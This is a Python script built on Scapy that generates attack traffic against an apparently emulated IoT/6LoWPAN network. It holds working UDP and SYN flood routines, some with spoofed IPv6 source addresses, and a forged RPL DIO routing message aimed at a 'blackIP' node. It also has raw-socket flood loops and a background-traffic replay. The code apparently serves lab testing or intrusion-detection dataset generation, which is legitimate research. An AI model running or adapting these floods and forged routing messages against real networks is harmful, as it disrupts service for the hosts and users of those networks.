import socket, struct
import sys
import time
from random import *
from scapy.all import *
from scapy.contrib.rpl import *

blackIP = 'fe80::4%sensor2-pan0'
victimIP = '10.0.0.2'
#victimIP = 'fe80::90ab:bdff:fe76:d810'
DODAGID = 'fd3c:be8a:173f:8e80:fca9:56ae:6251:1d50'
BACKGROUND = 'SmallbigFlows3.pcap'

def debugRouting():
    conf.route6
    #conf.route6.add(dst="fe80::/64", gw="fe80::2caa:78ff:fe0d:a3b%sensor5-eth2", dev="sensor5-eth2")
    #conf.route6.add(dst="fe80::/64", gw="fe80::38dd:10ff:fea4:3896", dev="sensor5-eth2")
    #conf.route6.add(dst="fe80::2caa:78ff:fe0d:a3b/64", gw="fe80::38dd:10ff:fea4:3896", dev="sensor5-eth2")
    conf.route6.route('fe80::2caa:78ff:fe0d:a3b%sensor5-eth2', dev="sensor5-eth2")
    z = IPv6()
    z.dst = victimIP
    send(z, iface="sensor5-eth2")


def UDP_flood_local(victimIP):
    #must be link local scope address
    #IP = 'fe80::4%sensor3-pan0'
    s = socket.socket(socket.AF_INET6,socket.SOCK_DGRAM)
    scopeID = 0
    for ainfo in socket.getaddrinfo(victimIP, 8080):
        if ainfo[0].name == 'AF_INET6' and ainfo[1].name == 'SOCK_DGRAM':
            scopeID = ainfo[4][3]
            break
    s.connect((victimIP, RandShort(), 0, scopeID))
    mystream = StreamSocket(s)
    payload=Raw(os.urandom(randrange(1400)))
    mystream.send(payload)
   # time.sleep(0.1)

def UDP_flood(victimIP):
    s=socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
    s.connect((victimIP, RandShort()))
    mystream=StreamSocket(s)
    payload=Raw(os.urandom(65))
    mystream.send(payload)
    time.sleep(0.1)

def SYN_flood_local(victimIP):
    #must be link local scope address
    #IP = 'fe80::4%sensor3-pan0'
    s = socket.socket(socket.AF_INET6,socket.SOCK_RAW, socket.IPPROTO_TCP)
    scopeID = 0
    for ainfo in socket.getaddrinfo(victimIP, 8080):
        if ainfo[0].name == 'AF_INET6' and ainfo[1].name == 'SOCK_RAW':
            scopeID = ainfo[4][3]
            break
    spoof = "fd3c:be8a:173f:8e80:d3d1:1dac:25ba:" + ":".join(("%x" % randint(0, 16**4) for i in range(1)))
    s.bind((spoof, 0))
    s.connect((victimIP, RandShort(), 0, scopeID))
    mystream = StreamSocket(s)
    syn = TCP(sport=RandShort(), dport=80, flags="S")
    mystream.send(syn)

def SYN_flood(victimIP):
    s=socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_TCP)
    s.connect((victimIP, RandShort()))
    mystream = StreamSocket(s)
    syn = TCP(sport=RandShort(), dport=80, flags="S")
    mystream.send(syn)
    time.sleep(0.1)

def RPL_control(blackIP):
    #must be link local scope address
    #blackIP = 'fe80::4%sensor3-pan0'
    s = socket.socket(socket.AF_INET6,socket.SOCK_RAW, socket.IPPROTO_ICMPV6)
    scopeID = 0
    for ainfo in socket.getaddrinfo(blackIP, 8080):
        if ainfo[0].name == 'AF_INET6' and ainfo[1].name == 'SOCK_RAW':
            scopeID = ainfo[4][3]
            break
    s.connect((blackIP, RandShort(), 0, scopeID))
    mystream = StreamSocket(s)
    control_message = ICMPv6RPL(code=1)/RPLDIO(RPLInstanceID=1,ver=3,rank=1\
            ,mop=2,dodagid=DODAGID)\
            /RPLOptRIO(otype=3,plen=64,prf=5,prefix='fd3c:be8a:173f:8e80::')
    mystream.send(control_message)

def sort_gen_type(victimIP, payload):
    time.sleep(0.1)
    if TCP in payload:
        s=socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.connect((victimIP, RandShort()))
        mystream = StreamSocket(s)
        mystream.send(payload)
    elif (ICMP in payload):
        s = socket.socket(socket.AF_INET6,socket.SOCK_RAW, socket.IPPROTO_ICMPV6)
        s.connect((victimIP, RandShort()))
        mystream = StreamSocket(s)
        mystream.send(payload)
    else:
        s=socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
        s.connect((victimIP, RandShort()))
        mystream=StreamSocket(s)
        mystream.send(payload)

def send_datalink_UDP(victimIP):
    num_attackers = 1
    stored_exception = None
    total_count = 0
    count = {}
    available_ips = [ socket.inet_ntoa(struct.pack('!L', i + 167772160)) \
            for i in range(1, num_attackers + 1)]
    for ip in available_ips:
        count[ip] = 0
    s = conf.L3socket(iface='h1-eth0')
    while True:
        try:
            udp = UDP(sport=RandShort(), dport=RandShort())/Raw(os.urandom(randrange(1400)))
            src = available_ips[randint(0, len(available_ips) - 1)]
            z = IP(src=src, dst=victimIP)
            count[src] += 1
            s.send(z/udp)
            total_count += 1
            if count[src] >= 500:
                available_ips.remove(src)
            if stored_exception or (len(available_ips) == 0):
                print( str(total_count) + " total packets sent.")
                break
        except KeyboardInterrupt:
            stored_exception = sys.exc_info()

def send_datalink_SYN(victimIP):
    #z = fuzz(Dot15d4Data())
    #z = z/LoWPAN_IPHC()/IPv6()
    num_attackers = 1
    stored_exception = None
    total_count = 0
    count = {}
    available_ips = [ socket.inet_ntoa(struct.pack('!L', i + 167772160)) \
            for i in range(1, num_attackers + 1)]
    for ip in available_ips:
        count[ip] = 0
    s = conf.L3socket(iface='h1-eth0')
    while True:
        try:
            syn = TCP(sport=RandShort(), dport=80, flags="S")
            src = available_ips[randint(0, len(available_ips) - 1)]
            #z = Ether()/IP(src=src, dst=victimIP)
            z = IP(src=src, dst=victimIP)
            count[src] += 1
            #sendp(z/syn, iface="h1-eth0")
            s.send(z/syn)
            total_count += 1
            if count[src] >= 500:
                available_ips.remove(src)
            if stored_exception or (len(available_ips) == 0):
                print( str(total_count) + " total packets sent.")
                break
        except KeyboardInterrupt:
            stored_exception = sys.exc_info()

def traffic_gen(victimIP):
    stored_exception = None
    background = rdpcap(BACKGROUND)
    count = 0
    z = IPv6()
    z.dst = victimIP
    while True:
        try:            
            sample = background[randint(0, len(background) - 1)]
            if IP in sample:
                payload = sample[IP].payload
                z.payload = payload
                z.src = "fd3c:be8a:" + ":".join(("%x" % randint(0, 16**4) for i in range(6)))
                #sort_gen_type(victimIP, payload)
                send(z)
                count += 1
            if stored_exception:
                print( str(count) + " total packets sent.")
                break
        except KeyboardInterrupt:
            stored_exception = sys.exc_info()

stored_exception = None
if len(sys.argv) < 2:
    print("-u : UDP flood")
    print("-s : SYN flood")
    print("-d : RPL DIO message")
    print("-b : background traffic")
elif sys.argv[1] == "-u":
    while True:
        try:
            UDP_flood_local(victimIP)
            if stored_exception:
                break
        except KeyboardInterrupt:
            stored_exception = sys.exc_info()
elif sys.argv[1] == "-s":
    while True:
        try:
            SYN_flood_local(victimIP)
            if stored_exception:
                break
        except KeyboardInterrupt:
            stored_exception = sys.exc_info()
elif sys.argv[1] == "-d":
    RPL_control(blackIP)
elif sys.argv[1] == "-b":
    traffic_gen(victimIP)
elif sys.argv[1] == "--dudp":
    send_datalink_UDP(victimIP)
elif sys.argv[1] == "--dsyn":
    send_datalink_SYN(victimIP)
else:
    print("Unrecognized flag")

exit()

